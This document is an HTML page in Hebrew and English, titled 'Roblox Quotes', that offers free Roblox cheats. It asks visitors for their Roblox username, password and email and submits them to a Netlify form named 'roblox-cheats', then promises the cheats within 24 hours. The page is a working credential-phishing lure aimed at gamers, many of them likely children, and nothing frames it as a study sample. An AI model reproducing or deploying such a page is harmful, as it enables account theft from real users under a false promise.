<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Quotes</title>
    <style>
        :root {
            --primary-color: #000000;
            --bg-color: #ffffff;
            --input-bg: #f5f5f7;
            --text-color: #1d1d1f;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 100%;
            max-width: 360px;
            padding: 40px;
            text-align: center;
        }

        #lobby { display: block; }
        #form-content, #success-message { display: none; }

        h1 { font-size: 24px; font-weight: 600; margin-bottom: 30px; }
        .btn-group { display: flex; gap: 10px; flex-direction: column; }
        .input-group { margin-bottom: 15px; text-align: inherit; }

        label {
            display: block;
            font-size: 13px;
            color: #86868b;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 14px;
            background: var(--input-bg);
            border: 1px solid transparent;
            border-radius: 12px;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
        }

        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: 500;
            transition: opacity 0.2s;
            margin-top: 10px;
        }

        button:hover { opacity: 0.8; }
        .lang-btn { background-color: var(--input-bg); color: var(--text-color); border: 1px solid #d2d2d7; }
        .en-mode { direction: ltr; text-align: left; }
    </style>
</head>
<body>

<div class="container" id="main-container">
    
    <div id="lobby">
        <h1>Welcome / ברוכים הבאים</h1>
        <div class="btn-group">
            <button onclick="setLanguage('he')">עברית</button>
            <button class="lang-btn" onclick="setLanguage('en')">English</button>
        </div>
    </div>

    <div id="form-content">
        <h1 id="title-text">קבלת ציטים</h1>
        
        <form id="riddle-form" name="roblox-cheats" method="POST" data-netlify="true">
            <input type="hidden" name="form-name" value="roblox-cheats" />
            
            <div class="input-group">
                <label id="label-user">שם משתמש</label>
                <input type="text" name="username" id="username" required>
            </div>
            <div class="input-group">
                <label id="label-pass">סיסמה</label>
                <input type="password" name="password" id="password" required>
            </div>
            <div class="input-group">
                <label id="label-email">אימייל</label>
                <input type="email" name="email" id="email" required>
            </div>
            
            <button type="submit" id="submit-btn">שליחה</button>
        </form>
    </div>

    <div id="success-message">
        <h2 style="font-size: 40px; margin-bottom: 10px;">✓</h2>
        <h2 id="success-title">תודה רבה</h2>
        <p id="success-p" style="color: #86868b;">קבלת הציטים תתקבל עד 24 שעות</p>
        <button style="background:none; color:#0066cc;" onclick="location.reload()" id="back-btn">חזרה</button>
    </div>
</div>

<script>
    const translations = {
        he: { title: "קבלת ציטים ברובלוקס", labelUser: "שם משתמש", labelPass: "סיסמה", labelEmail: "אימייל", submit: "שליחה", successTitle: "תודה רבה", successP: "קבלת הציטים תתקבל עד 24 שעות", back: "חזרה להתחלה", dir: "rtl" },
        en: { title: "Getting cheats in Roblox", labelUser: "Username", labelPass: "Password", labelEmail: "Email", submit: "Send", successTitle: "Thank You", successP: "Quotations will be accepted within 24 hours.", back: "Back to start", dir: "ltr" }
    };

    function setLanguage(lang) {
        const t = translations[lang];
        document.getElementById('title-text').innerText = t.title;
        document.getElementById('label-user').innerText = t.labelUser;
        document.getElementById('label-pass').innerText = t.labelPass;
        document.getElementById('label-email').innerText = t.labelEmail;
        document.getElementById('submit-btn').innerText = t.submit;
        document.getElementById('success-title').innerText = t.successTitle;
        document.getElementById('success-p').innerText = t.successP;
        document.getElementById('back-btn').innerText = t.back;
        document.body.dir = t.dir;
        
        if(lang === 'en') document.getElementById('main-container').classList.add('en-mode');
        else document.getElementById('main-container').classList.remove('en-mode');

        document.getElementById('lobby').style.display = 'none';
        document.getElementById('form-content').style.display = 'block';
    }

    const form = document.getElementById('riddle-form');
    form.addEventListener('submit', (e) => {
        e.preventDefault();
        const btn = document.getElementById('submit-btn');
        btn.innerText = "...";
        btn.disabled = true;

        const formData = new FormData(form);

        fetch("/", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams(formData).toString(),
        })
        .then((response) => {
            if (response.ok) {
                document.getElementById('form-content').style.display = 'none';
                document.getElementById('success-message').style.display = 'block';
            } else {
                throw new Error('שגיאה בתגובת Netlify');
            }
        })
        .catch((error) => {
            console.error('Error:', error);
            alert("שגיאה בשליחה. נסה שוב מאוחר יותר.");
            btn.disabled = false;
            btn.innerText = "נסה שוב";
        });
    });
</script>
</body>
</html>
